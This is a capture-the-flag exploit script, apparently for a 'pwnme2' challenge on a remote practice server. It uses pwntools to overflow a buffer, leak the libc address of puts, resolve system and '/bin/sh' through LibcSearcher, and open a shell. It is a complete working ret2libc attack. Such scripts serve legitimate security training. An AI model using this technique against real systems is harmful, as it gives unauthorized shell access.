from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process("./pwnme2")
io = remote("node4.buuoj.cn", 29174)
elf = ELF("./pwnme2")

payload = cyclic(0x70)
payload += p32(elf.plt['puts'])
payload += p32(elf.symbols['main'])
payload += p32(elf.got['puts'])

io.sendlineafter('Please input:', payload)
io.recvuntil(b'Hello')
io.recvuntil(b'\n')
puts = u32(io.recv(4))
print(hex(puts))
libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
system = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')
print(hex(binsh))

payload = cyclic(0x70)
payload += p32(system)
payload += p32(elf.symbols['main'])
payload += p32(binsh)
io.sendlineafter('Please input:', payload)

io.interactive()
